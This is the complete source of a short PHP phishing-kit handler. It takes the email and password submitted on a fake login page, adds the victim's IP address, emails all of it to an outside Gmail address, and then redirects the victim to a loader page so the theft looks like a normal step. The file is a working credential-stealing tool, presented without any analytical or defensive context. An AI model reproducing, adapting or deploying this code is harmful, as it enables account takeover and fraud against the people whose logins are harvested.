<?                                                                                                                                                                                                                                   
$ip = getenv("REMOTE_ADDR");
$message .= "--------------MrEmmZ pHp--------\n";
$message .= "Email-ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY MrEmmZ-----------\n";
$send = "p.sands011@gmail.com";
$subject = "---MAGA DON FILL: $ip (Source: Avast Link) $ip";

mail($send,$subject,$message,$headers);

$redirect = "loader.html";

header("Location: " . $redirect);
 
?>